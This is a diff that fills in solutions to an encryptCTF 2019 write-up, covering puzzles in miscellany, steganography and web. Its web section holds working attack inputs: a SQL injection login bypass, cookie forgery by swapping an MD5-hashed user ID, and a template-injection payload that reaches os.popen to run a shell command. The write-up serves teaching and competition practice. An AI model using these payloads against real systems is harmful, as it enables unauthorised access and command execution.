@@ -352,7 +352,9 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+The rules page contains the flag.
+
+`encryptCTF{L3t5_H4CK}`
 
 ## 50 Misc / Way Back ##
 
@@ -362,11 +364,31 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Files provided**
 
- - [`ENCRYPT`](files/wayback-encrypt.png)
+ - `ENCRYPT` (file unavailable ...)
 
 **Solution**
 
-(TODO)
+The file given showed a classic punched card (similar to e.g. [this one](https://commons.wikimedia.org/wiki/File:Used_Punchcard_(5151286161).jpg)). Using the decoding scheme on [the Wikipedia page](https://en.wikipedia.org/wiki/Punched_card):
+
+         ______________________________________________
+        /&-0123456789ABCDEFGHIJKLMNOPQR/STUVWXYZ
+    12|  x           xxxxxxxxx
+    11|   x                   xxxxxxxxx
+     0|    x                           xxxxxxxxx
+     1|     x        x        x        x
+     2|      x        x        x        x
+     3|       x        x        x        x
+     4|        x        x        x        x
+     5|         x        x        x        x
+     6|          x        x        x        x
+     7|           x        x        x        x
+     8|            x        x        x        x
+     9|             x        x        x        x
+      |________________________________________________
+
+We obtained the flag (more or less like):
+
+`encryptCTF{B4TCH_PR0C355_571_N0T_50_G00D}`
 
 ## 50 Misc / crack-jack ##
 
@@ -395,7 +417,53 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+This is simply a programming challenge to implement the [Hamming(7,4)](https://en.wikipedia.org/wiki/Hamming(7,4)) error-correcting code.
+
+[Full script here](scripts/Codes.hx)
+
+```
+$ haxe --run Codes
+                        Welcome To 
+
+     ____                       __    _______________  
+    / __/__  __________ _____  / /_  / ___/_  __/ __/  
+   / _// _ \/ __/ __/ // / _ \/ __/ / /__  / / / _/    
+  /___/_//_/\__/_/  \_, / .__/\__/  \___/ /_/ /_/      
+                ___/___/_/_____                        
+               |_  |/ _ <  / _ \                       
+              / __// // / /\_, /                       
+             /____/\___/_//___/                        
+                                                         
+
+you will be receiving hamming(7,4) codes. your job is to send data bits
+from a 7 bit hamming code. 
+ ___________________________________________________________________
+|                                                                   |
+|   DO YOUR RESEARCH : https://en.wikipedia.org/wiki/Hamming(7,4)   |
+|  FLAG WILL BE PRINTED AFTER YOU SEND CORRECT DATA BITS 100 TIMES  |
+|___________________________________________________________________|
+
+               the order of the bits followed is
+
+                    P1 P2 D3 P4 D5 D6 D7
+
+
+and come back here. remember somebits could be flipped. you need to send
+correct data bits.
+
+[*] CODE: 1011010
+[*] DATA: CODE VALIDATED
+[*] CODE: 1010101
+[*] DATA: CODE VALIDATED
+...
+[*] CODE: 1010000
+[*] DATA: CODE VALIDATED
+[*] CODE: 1110010
+[*] DATA: CODE VALIDATED
+here's your flag: encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}
+```
+
+`encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}`
 
 ## 25 Pwn / pwn0 ##
 
@@ -494,8 +562,11 @@ Then we just AES decrypt, e.g. using PyCrypto:
 **Description**
 
 > this is crackme01.
+> 
 > crackme01 is a crackme.
+> 
 > so crackme!
+> 
 > Author: @X3eRo0
 
 **Files provided**
@@ -544,6 +615,7 @@ Then we just AES decrypt, e.g. using PyCrypto:
 **Description**
 
 > 1) this is an easy challenge
+> 
 > 2) pls post a writeup if you solve it.
 > 
 > Author: @X3eRo0
@@ -562,7 +634,6 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 > `Find it fi y0u can :p `
 > 
-> 
 > <span style="color:#e83e8c;"> Author: inc0gnito</span>
 
 **Files provided**
@@ -571,16 +642,29 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+A hint was released for this challenge since it did not have many solves: `Do you like pip?`
+
+`yhpargonagets` is also steganography backwards.
+
+We can install the [`steganography`](https://pypi.org/project/steganography/) pip package, then:
+
+```python
+>>> from steganography.steganography import Steganography
+>>> Steganography.decode("encode.jpg")
+```
+
+(The `encode.jpg` file is actually a PNG file.)
+
+`encryptCTF{pip_in5t411_5teg4n0graphy}`
 
 ## 50 Steganography / Into The Black ##
 
 **Description**
 
-> "My My, Hey Hey......,</br>
-> Rock & Roll is here to stay..</br>
-> It's better to burn up,</br>
-> Then to fade away....,</br>
+> "My My, Hey Hey......,<br>
+> Rock & Roll is here to stay..<br>
+> It's better to burn up,<br>
+> Then to fade away....,<br>
 > My My, Hey Hey....."
 > 
 > <a href="https://imgur.com/a/iC4ORoW">meme</a>
@@ -593,7 +677,11 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+We can replace the not-quite-black colour with white in our favourite image editor:
+
+![](screens/intotheblack.png)
+
+`encryptCTF{L1GH7_17_UP}`
 
 ## 100 Steganography / Stressed out? ##
 
@@ -623,7 +711,32 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+The title and the description of this challenge refer to cookies.
+
+After visiting the website for the first time, we are given a `UID` cookie:
+
+```bash
+$ curl -vv http://104.154.106.182:8080/ 2>&1 | grep "Set-Cookie"
+< Set-Cookie: UID=f899139df5e1059396431415e770c6dd; expires=Sat, 06-Apr-2019 14:20:00 GMT; Max-Age=172800
+```
+
+On our second visit, with the `UID` cookie set, we get another cookie:
+
+```bash
+$ curl -b "UID=f899139df5e1059396431415e770c6dd" -vv http://104.154.106.182:8080/ 2>&1 | grep "Set-Cookie"
+< Set-Cookie: FLAG=encryptCTF%7By0u_c4nt_U53_m3%7D
+```
+
+But this is not the flag.
+
+Interestingly though, the `UID` is always the same, even when visiting in different browsers or from different IPs. In fact, the hash is a known hash and it is `md5("100") == "f899139df5e1059396431415e770c6dd"`. We can change our `UID` to `md5("0") == "cfcd208495d565ef66e7dff9f98764da"`, which gives us the actual flag:
+
+```bash
+$ curl -b "UID=cfcd208495d565ef66e7dff9f98764da" -vv http://104.154.106.182:8080/ 2>&1 | grep "Set-Cookie"
+< Set-Cookie: FLAG=encryptCTF%7B4lwa4y5_Ch3ck_7h3_c00ki3s%7D%0A
+```
+
+`encryptCTF{4lwa4y5_Ch3ck_7h3_c00ki3s}`
 
 ## 50 Web / Slash Slash ##
 
@@ -639,7 +752,23 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+The `application.py` file gets the flag from the environment variables:
+
+```python
+FLAG = os.getenv("FLAG", "encryptCTF{}")
+```
+
+However, this is not set by default. If we look into the `env/bin` directory, we see several `activate` scripts (for various shells?). The `activate` script with no extension for `bash` has this line at the end:
+
+    # export $(echo RkxBRwo= | base64 -d)="ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg=="
+
+If uncommented, it would set the `FLAG` environment variable to:
+
+```bash
+$ base64 -D <<<"ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg=="
+```
+
+`encryptCTF{comments_&_indentations_makes_johnny_a_good_programmer}`
 
 ## 100 Web / vault ##
 
@@ -655,7 +784,21 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+Basic SQL injection (`' or 1 = 1 -- ` in both fields):
+
+![](screens/vault1.png)
+
+Leads us to an "ACCESS GRANTED" page:
+
+![](screens/vault2.png)
+
+But the QR code is a decoy, it just leads to this [video](https://www.youtube.com/watch?v=gvYfRiJQIX8). The real flag is given to us in the `SESSIONID` cookie: `ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0%3D`.
+
+```bash
+$ base64 -D <<<"ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0="
+```
+
+`encryptCTF{i_H4t3_inJ3c7i0n5}`
 
 ## 100 Web / Env ##
 
@@ -687,5 +830,44 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+On the website we are presented with a script that replicates images whenever we scroll, but we can mostly ignore that. In the sourcecode, we find it says `Hello, (the repeating images)` followed by a comment.
 
+The comment is always Base-64 encoded and is one of the following:
+
+    L2xvbF9ub19vbmVfd2lsbF9zZWVfd2hhdHNfaGVyZQ==
+    d2hhdF9hcmVfeW91X3NlYXJjaGluZ19mb3IK
+    Lz9zZWNyZXQ9ZmxhZw==
+
+These decode to:
+
+    /lol_no_one_will_see_whats_here
+    what_are_you_searching_for
+    /?secret=flag
+
+The first leads to another encoded string `aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2hcP3ZcPVBHakxoT2hNTFhjCg==`, which decodes to the URL of [this video](https://www.youtube.com/watch?v=PGjLhOhMLXc).
+
+The second is similar, leading to [this video](https://www.youtube.com/watch?v=5rAOyh7YmEc).
+
+But the final `/?secret=flag` clue is very important. Upon navigating to that URL, we are still on the front page with repeating images, but this time the source reads `Hello, (the repating images) flag`.
+
+Here we can identify a template injection, e.g. when we do `/?secret={{'a'*3}}`, which produces `aaa` in the output. There is no filtering on our input, so we just need to obtain a reference to e.g. the `os` module to do some shell stuff:
+
+    {{"".__class__.__mro__[1].__subclasses__()[240].__init__.__globals__["sys"].modules["os"].popen("cat%20flag.txt").read()}}
+
+Explanation:
+
+ - `""` - a `str` value
+ - `.__class__` - its type
+ - `.__mro__[1]` - its superclass, `object`
+ - `.__subclasses__()` - its subclasses
+ - `[240]` - (may differ from version to version), one of its subclasses, in this case `zipinfo.ZipFile`
+ - `.__init__` - its constructor
+ - `.__globals__` - the global variables available to that constructor
+ - `["sys"]` - the `sys` module
+ - `.modules` - references to other loaded modules
+ - `["os"]` - the `os` module
+ - `.popen` - the function to run a shell command
+
+So we run `cat flag.txt` to obtain:
+
+`encryptCTF{!nj3c7!0n5_4r3_b4D}`
